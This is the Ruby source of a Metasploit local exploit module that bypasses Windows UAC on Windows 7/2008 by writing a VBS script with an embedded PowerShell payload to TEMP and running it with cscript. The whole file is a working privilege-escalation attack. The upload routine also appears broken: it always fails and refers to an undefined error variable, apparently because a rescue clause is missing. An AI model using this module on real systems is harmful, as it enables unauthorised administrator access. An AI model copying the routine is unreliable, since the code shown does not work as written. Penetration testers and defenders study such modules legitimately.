# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::FileDropper
  include Exploit::Powershell
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;          => &#039;Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)&#039;,
      &#039;Description&#039;   => %q{
        This module will bypass Windows UAC by utilizing the missing .manifest on the script host
        cscript/wscript.exe binaries.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;Vozzie&#039;,
          &#039;Ben Campbell&#039;
        ],
      &#039;Platform&#039;      => [ &#039;win&#039; ],
      &#039;Targets&#039;       => [
          [ &#039;Automatic&#039;, { &#039;Arch&#039; => [ ARCH_X86, ARCH_X86_64 ] } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [
          &#039;URL&#039;, &#039;http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html&#039;,
          &#039;URL&#039;, &#039;https://github.com/Vozzie/uacscript&#039;
        ]
      ],
      &#039;DisclosureDate&#039;=> &#039;Aug 22 2015&#039;
    ))

  end

  def exploit
    # Validate that we can actually do things before we bother
    # doing any more work
    validate_environment!
    check_permissions!

    # get all required environment variables in one shot instead. This
    # is a better approach because we don&#039;t constantly make calls through
    # the session to get the variables.
    env_vars = get_envs(&#039;TEMP&#039;, &#039;WINDIR&#039;)

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good(&#039;UAC is set to Default&#039;)
        print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
      when UAC_NO_PROMPT
        print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
        shell_execute_exe
        return
    end

    vbs_filepath = "#{env_vars[&#039;TEMP&#039;]}\\#{rand_text_alpha(8)}.vbs"

    upload_vbs(vbs_filepath)

    cmd_exec("cscript.exe //B #{vbs_filepath}")
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end

  def upload_vbs(payload_filepath)
    vbs = File.read(File.join(Msf::Config.data_directory,
                                  &#039;exploits&#039;,
                                  &#039;scripthost_uac_bypass&#039;,
                                  &#039;bypass.vbs&#039;))

    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true)

    vbs.gsub!(&#039;COMMAND&#039;, command)
    print_status(&#039;Uploading the Payload VBS to the filesystem...&#039;)
    begin
      vprint_status("Payload VBS #{vbs.length} bytes long being uploaded..")
      write_file(payload_filepath, vbs)
      register_file_for_cleanup(payload_filepath)
      fail_with(Failure::Unknown, "Error uploading file #{payload_filepath}: #{e.class} #{e}")
    end
  end

  def validate_environment!
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?

    winver = sysinfo[&#039;OS&#039;]

    case winver
    when /Windows (7|2008)/
      print_good("#{winver} may be vulnerable.")
    else
      fail_with(Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status(&#039;UAC is Enabled, checking level...&#039;)
    else
      unless is_in_admin_group?
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end
  end
end

